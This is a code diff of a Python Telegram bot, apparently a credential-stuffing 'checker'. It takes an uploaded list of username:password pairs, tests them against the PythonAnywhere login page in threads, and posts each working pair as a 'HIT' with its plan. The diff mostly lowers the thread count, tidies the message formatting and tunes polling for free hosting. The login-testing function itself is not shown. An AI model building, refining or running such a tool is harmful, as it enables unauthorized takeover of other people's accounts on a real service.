@@ -1,4 +1,5 @@
 import asyncio
+import os
 import requests
 from bs4 import BeautifulSoup
 from concurrent.futures import ThreadPoolExecutor
@@ -10,12 +11,11 @@ from telegram.ext import (
     ContextTypes,
     filters
 )
-import os
 
 # ---------------- CONFIG ----------------
-BOT_TOKEN = os.getenv("TOKEN")  # توکن لە Railway Variables وەرگرە
+BOT_TOKEN = os.getenv("TOKEN")  # دڵنیابکە توکن لە Variables زیاد کراوە
 LOGIN_URL = "https://www.pythonanywhere.com/login/"
-MAX_THREADS = 60
+MAX_THREADS = 5
 
 headers = {
     "User-Agent": "Mozilla/5.0",
@@ -110,24 +110,20 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     loop = asyncio.get_running_loop()
 
     for username, password in accounts:
-        result, plan = await loop.run_in_executor(
-            executor, check_account, username, password
-        )
+        # ✅ run_in_executor to avoid blocking
+        result, plan = await loop.run_in_executor(executor, check_account, username, password)
 
         if result == "HIT":
             hit += 1
             await update.message.reply_text(
-                f"✅ HIT\n"
-                f"{username}:{password}\n"
-                f"Plan: {plan}"
+                f"✅ HIT\n{username}:{password}\nPlan: {plan}"
             )
         else:
             bad += 1
 
+        # 🔄 Live status update
         await status_msg.edit_text(
-            f"🚀 Checking...\n\n"
-            f"✅ Hit :- {hit}\n"
-            f"❌ Bad :- {bad}"
+            f"🚀 Checking...\n\n✅ Hit :- {hit}\n❌ Bad :- {bad}"
         )
 
     await update.message.reply_text("🏁 Done!")
@@ -135,11 +131,11 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # ---------------- RUN ----------------
 def main():
     app = ApplicationBuilder().token(BOT_TOKEN).build()
-
     app.add_handler(CommandHandler("start", start))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
-
-    app.run_polling()
+    
+    # ✅ polling optimized for Railway free plan
+    app.run_polling(poll_interval=5, timeout=20)
 
 if __name__ == "__main__":
     main()
